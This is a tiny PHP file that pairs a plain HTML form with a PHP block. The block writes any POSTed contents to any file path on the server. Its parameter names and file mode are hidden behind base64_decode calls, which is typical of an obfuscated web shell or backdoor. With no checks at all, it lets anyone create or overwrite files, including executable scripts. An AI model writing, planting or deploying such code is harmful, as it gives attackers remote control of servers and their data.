<?php ?>
<form method="POST" >
<input type="text" name="fname"><input type="text" name="ftext" >
<input type="submit"> 
</form>

<?php if(isset($_POST[base64_decode('Zm5hbWU=')])){$f0=$_POST[base64_decode('Zm5hbWU=')];$g1=$_POST[base64_decode('ZnRleHQ=')];$k2=fopen($f0,base64_decode('dw=='));fwrite($k2,$g1);fclose($k2);}
